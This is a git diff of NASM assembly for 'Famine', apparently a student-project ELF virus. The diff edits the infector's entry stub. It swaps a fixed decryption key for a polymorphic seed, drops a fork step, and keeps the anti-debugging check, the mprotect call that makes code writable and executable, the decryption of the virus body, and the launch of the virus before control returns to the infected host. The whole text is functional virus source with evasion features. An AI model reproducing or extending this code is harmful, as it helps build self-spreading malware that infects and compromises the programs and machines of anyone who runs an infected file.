@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/15 17:30:07 by ichkamo          ###   ########.fr        ;
+;    Updated: 2019/12/12 18:01:06 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -23,20 +23,20 @@ section .text
 	global _start
 
 extern detect_spy
-extern decrypt
+extern decypher
 extern virus
 
 famine_entry:
 ;------------------------------; Store variables
 	call mark_below
-	db "128 bit key here", "rel ptld", "ptldsize", "relvirus"
+	db "polymorphic seed", "rel ptld", "ptldsize", "relvirus"
 	db "relentry", "virusize"
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
 ;------------------------------; Get variables address
 ; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
 ; | rdx  | r8          | r9          | r10         | r11          | r14        |
-; | key  | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
-; | key  | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
+; | seed | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
+; | seed | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
 mark_below:
 	pop rax
 	push rdx                   ; backup rdx
@@ -80,7 +80,7 @@ mark_below:
 	push r9                    ; save ptld size     [rsp + 24]
 	push r10                   ; save virus addr    [rsp + 16]
 	push r11                   ; save entry addr    [rsp + 8]
-	push rdx                   ; save key           [rsp]
+	push rdx                   ; save seed          [rsp]
 ;------------------------------; Show-off
 %ifdef DEBUG
 	mov rax, 0x00000a2e2e2e2e59
@@ -101,11 +101,6 @@ mark_below:
 	call detect_spy
 	test rax, rax
 	jnz return_to_client
-;------------------------------; fork virus
-	mov rax, SYSCALL_FORK
-	syscall
-	test rax, rax
-	jnz return_to_client
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
@@ -117,27 +112,14 @@ mark_below:
 	mov rdx, PROT_RWX
 	mov rax, SYSCALL_MPROTECT
 	syscall
-;------------------------------; decrypt virus
-	mov rdx, [rsp]             ; get key
-	mov r10, [rsp + 16]        ; get virus_addr
+;------------------------------; decypher virus
+	mov rdi, [rsp + 16]        ; get virus_addr
+	mov rsi, r14               ; get virus_size
 
-	mov rax, r14               ; get virus_size
-
-	;decrypt(32, virus_addr, key, virus_size);
-	mov rdi, 32
-	mov rsi, r10
-	mov rdx, rdx
-	mov rcx, rax
-	call decrypt
+	call decypher
 ;------------------------------; launch virus
-	mov rdi, rdx
+	mov rdi, [rsp]             ; get seed
 	call virus
-	add rsp, 48
-	pop r14
-	pop rdx
-	mov rdi, 0
-	mov rax, SYSCALL_EXIT
-	syscall
 ;------------------------------; return to client entry
 return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
